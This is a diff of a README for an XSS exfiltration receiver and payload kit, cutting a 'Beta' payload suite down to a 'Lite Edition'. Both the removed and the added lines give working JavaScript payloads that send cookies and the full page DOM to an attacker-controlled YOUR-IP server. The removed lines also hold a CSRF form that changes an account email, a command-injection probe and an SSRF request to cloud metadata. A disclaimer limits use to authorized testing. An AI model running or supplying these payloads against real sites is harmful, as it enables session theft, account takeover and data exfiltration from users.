@@ -1,22 +1,18 @@
 
 
-# 🕵️ XSS Exfiltration Receiver & Payload Kit ( Beta )
+# 🕵️ XSS Exfiltration Receiver ( Lite Edition#)
 
-This package provides a complete system for capturing, decoding, and analyzing XSS-exfiltrated data via HTTP requests. 
-It includes a threaded Python-based receiver and a stealthy, modular JavaScript payload library designed for DOM inspection, internal API probing, light CSRF, and command injection testing.
+A lightweight HTTP server to capture, decode, and store exfiltrated data from XSS payloads via URL query parameters or POST bodies. 
+Supports recursive Base64 and URL decoding, automatic HTML detection, and file storage.
 
----
-
-## 📦 Contents (.. in development ..)
+## 📦 Contents
 
 ```
 
 xss\_receiver/
-├── xssrecv.py         # Python receiver (GET/POST support, decoder)
-├── payloads.js        # Modular JS payload library
-├── payloads.min.js    # Minified version for stealth deployment
-├── payloads.bmk.js    # Bookmarklet version
-└── README.md          # This file
+├── receiver__.py       # Python3 receiver server (GET/POST + decoder)
+├── decoded\_html/    # Output folder for saved HTML payloads
+└── README.md        # This file
 
 ````
 
@@ -24,171 +20,92 @@ xss\_receiver/
 
 ## 🚀 Getting Started
 
-### 1. Run the Receiver
+### 1. Start the Receiver
 
 ```bash
-python3 xssrecv.py --port 8080 --show --json-log --allow-ip 127.0.0.1
+python3 receiver__.py --port 8080 --show
 ````
 
-| Flag         | Description                                           |
-| ------------ | ----------------------------------------------------- |
-| `--port`     | Port to listen on (default: `80`)                     |
-| `--show`     | Print decoded HTML to terminal if present             |
-| `--json-log` | Save logs to `decoded_html/log.jsonl`                 |
-| `--allow-ip` | Restrict access to IPs (e.g., `--allow-ip 127.0.0.1`) |
+| Flag     | Description                                    |
+| -------- | ---------------------------------------------- |
+| `--port` | Port to listen on (default: `80`)              |
+| `--show` | Display decoded HTML in terminal (if detected) |
 
 ---
 
-### 2. Deliver JavaScript Payload
+### 2. Use with a Payload
 
-#### Option 1: Inline Injection
+You can exfiltrate Base64-encoded content to this server via:
 
-Inject this script into a vulnerable page:
+#### ➤ GET Example
 
 ```html
-<script src="http://YOUR-IP:8080/x.js"></script>
+<img src="http://YOUR-IP:8080/?data=BASE64_ENCODED_PAYLOAD">
 ```
 
-#### Option 2: Bookmarklet
+#### ➤ POST Example
 
-Paste the content of `payloads.bmk.js` into a bookmark and click it while visiting the target app.
-
----
-
-## 💥 Payload Overview
-
-The included `payloads.js` covers multiple testing scenarios:
-
-| Category        | Description                                          |
-| --------------- | ---------------------------------------------------- |
-| DOM Dump        | Collects and sends the full HTML DOM                 |
-| Cookie Theft    | Sends cookies and environment info                   |
-| CSRF (GET/POST) | Triggers light GET/POST CSRF to local endpoints      |
-| Command Probe   | Sends `id`, `whoami`, or `curl`-style blind requests |
-| SSRF            | Hits local/internal metadata endpoints               |
-| Probing         | Discovers `/api`, `/admin`, `/config` on same-origin |
-| Timing          | Profiles request latency                             |
-| Error Beacons   | Captures uncaught JS errors                          |
-
----
-
-## 🔐 Sample Payloads (Inside `payloads.js`)
-
-```js
-// DOM exfiltration
-postData(btoa(document.documentElement.outerHTML));
-
-// Cookie + fingerprint
-postData(btoa(document.cookie + " | " + navigator.userAgent));
-
-// CSRF auto-form
-let f = document.createElement("form");
-f.method = "POST";
-f.action = ORIGIN + "/account/change-email";
-let i = document.createElement("input");
-i.name = "email";
-i.value = "admin@attacker.test";
-f.appendChild(i);
-document.body.appendChild(f);
-f.submit();
-
-// Command Injection attempt
-fetch("/api/system/check", {
+```javascript
+fetch("http://YOUR-IP:8080/", {
   method: "POST",
-  body: JSON.stringify({ host: "127.0.0.1; id" }),
-  headers: { "Content-Type": "application/json" }
-}).then(r => r.text()).then(t => postData(btoa(t)));
-
-// SSRF to cloud metadata
-fetch("http://169.254.169.254/latest/meta-data/hostname")
-  .then(r => r.text()).then(t => postData(btoa(t)));
+  body: "data=BASE64_ENCODED_PAYLOAD"
+});
 ```
 
 ---
 
-## 🖥️ Hosting Payloads with the Receiver
+## 💡 Features
 
-Your `xssrecv.py` is preconfigured to serve:
-
-* `http://YOUR-IP:8080/x.js` → `payloads.js`
-* You can add:
-
-  * `x.min.js` → for stealth minified delivery
-  * `x.bmk.js` → for bookmarklet version
+* 🔁 Recursive decoding of Base64 and URL-encoded strings (up to 5 layers)
+* 🧠 HTML auto-detection via `<html>` / `<!doctype>` tags
+* 💾 Saves decoded HTML to `decoded_html/` folder with timestamped filenames
+* 👁️ Optional real-time display of decoded payloads
+* ✅ Supports both `GET` (query param) and `POST` (form body) exfiltration
 
 ---
 
-## 📂 Decoded Output
+## 🗂️ Output
 
-All captured and decoded data is saved to:
-
-| File/Folder               | Purpose                          |
-| ------------------------- | -------------------------------- |
-| `decoded_html/`           | Output directory                 |
-| `decoded_YYYYMMDDT..html` | Saved decoded HTML content       |
-| `raw_YYYYMMDDT..txt`      | Raw query string or POST data    |
-| `log.jsonl`               | JSON log of all captured entries |
-
-Each entry includes IP, timestamp, headers, decoded layers, and preview content.
+| Output Type           | Description                              |
+| --------------------- | ---------------------------------------- |
+| `decoded_html/*.html` | Decoded HTML payloads (auto-detected)    |
+| (stdout)              | Decoding layers, final preview, warnings |
 
 ---
 
-## 🔧 Extending
+## 🧪 Example Payloads
 
-You can easily extend `payloads.js` to:
+```javascript
+// DOM Exfiltration
+fetch("http://YOUR-IP:8080/?data=" + btoa(document.documentElement.outerHTML));
 
-* Add fingerprinting logic
-* Trigger internal SSRF/CSRF/RCE probes
-* Enumerate form fields, tokens, iframes, or script execution results
-* Chain logic with `setTimeout`, `Promise`, or `MutationObserver`
-
-You can also update `xssrecv.py` to:
-
-* Forward exfiltrated content to webhooks
-* Send email/SMS alerts
-* Automatically replay stored HTML
-
----
-
-## 🧪 Testing It Out
-
-1. Start the receiver:
-
-```bash
-python3 xssrecv.py --port 8080 --show --json-log
+// Cookie Theft
+fetch("http://YOUR-IP:8080/?data=" + btoa(document.cookie));
 ```
 
-2. On another device or browser, simulate the victim:
+---
 
-```html
-<script src="http://YOUR-IP:8080/x.js"></script>
-```
+## 🔐 Security Notice
 
-3. Watch decoded payloads being saved and printed in real time.
+This tool is intended for **authorized testing and education only**. Do not use against systems without **explicit written permission**. Follow ethical guidelines and all legal regulations in your jurisdiction.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## 🛠 TODO (Optional Future Features)
 
-This tool is for **authorized security testing and educational use only**. 
-Do not use against systems without **explicit written permission**. Always follow your organization's rules of engagement and testing scope.
-
----
-
-## 🛠 TODO / Ideas
-
-* [ ] Add TLS/HTTPS support
-* [ ] Webhook alert forwarding (Slack/Discord)
-* [ ] DOM replay viewer UI
-* [ ] Auto-generate signed payloads
-* [ ] Dockerfile + Makefile for deployment
+* Add JSON output support (e.g., `--json-log`)
+* Add IP filtering and allowlists
+* Add Slack/Webhook alerts
+* Add live HTML replay view in browser
 
 ---
 
-## 🧠 Credits
+## 👨‍💻 Author Notes
 
-Built by operators for operators. Use responsibly.
+This is a simplified version of a more feature-rich receiver/payload suite. 
+Designed to be easy to run and inspect in minimal environments. For more advanced use cases, see the full version (coming soon).
 
-```
-\
+Built with ❤️ by security researchers, for security researchers.
+
+
 
